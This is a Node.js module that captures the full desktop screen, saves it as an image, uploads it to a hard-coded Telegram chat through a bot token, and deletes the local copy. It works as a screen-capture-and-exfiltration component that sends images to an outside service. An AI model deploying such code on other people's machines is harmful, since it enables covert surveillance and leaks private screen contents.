
const jimp = require('jimp');
const robot = require('robotjs');
const FormData = require('form-data');
const fs = require('fs');
const fetch = require('node-fetch');
const { exec } = require('child_process');

const { TGTOKEN } = require('./config');

function getScreenSize() {
  return new Promise((resolve, reject) => {
      exec('xrandr', (error, stdout, stderr) => {
          if (error) {
              reject(error);
              return;
          }
          if (stderr) {
              reject(new Error(stderr));
              return;
          }

          const resolutionLine = stdout.split('\n').find(line => line.includes('*'));
          if (!resolutionLine) {
              reject(new Error('Не удалось найти текущее разрешение экрана'));
              return;
          }
         
          const resolutionPart = resolutionLine.split(' ').filter(element => element !== '');
          const [widthStr, heightStr] = resolutionPart[0].split('x');
  
          const width = parseInt(widthStr, 10);
          const height = parseInt(heightStr, 10);

          resolve({ width, height });
      });
  });
}

async function desktopSnapshot() {
    try {
      await new Promise(async(resolve, reject) => {
        const screenSize = await getScreenSize()
        const screen = robot.screen.capture(0, 0, screenSize.width, screenSize.height);
    
        new jimp(screen.width, screen.height, async function (err, img) {
          if (err) {
            reject(err);
            return;
          }
    
          img.bitmap.data = screen.image;
          img.scan(0, 0, img.bitmap.width, img.bitmap.height, function (x, y, idx) {
            var red = img.bitmap.data[idx + 0];
            var blue = img.bitmap.data[idx + 2];
            img.bitmap.data[idx + 0] = blue;
            img.bitmap.data[idx + 2] = red;
          });
    
          img.write('snapshot.png')
          resolve ()
        });
      });
      await sendSnapshot('snapshot.png')
   } catch (error) {
    const errorMessage = `desktopSnapshot Error: ${error.message}`;
    throw new Error(errorMessage);
   } finally {
     fs.unlinkSync('snapshot.png');
   }
    
  }

async function sendSnapshot(imagePath) {
    const url = `https://api.telegram.org/bot${TGTOKEN}/sendPhoto`;
    
    const formData = new FormData();
    formData.append('chat_id', '-1002022520053');
    formData.append('photo', fs.createReadStream(imagePath));
  
    try {
      const response = await fetch(url, {
        method: 'POST',
        body: formData
      });
  
      if (!response.ok) {
        const errorMessage = `sendSnapshot Error: ${response.status} - ${response.statusText}`;
        throw new Error(errorMessage);
      }
  
    } catch (error) {
      console.error('Error:', error);
    }
  }
  
  module.exports = {desktopSnapshot}
  getScreenSize()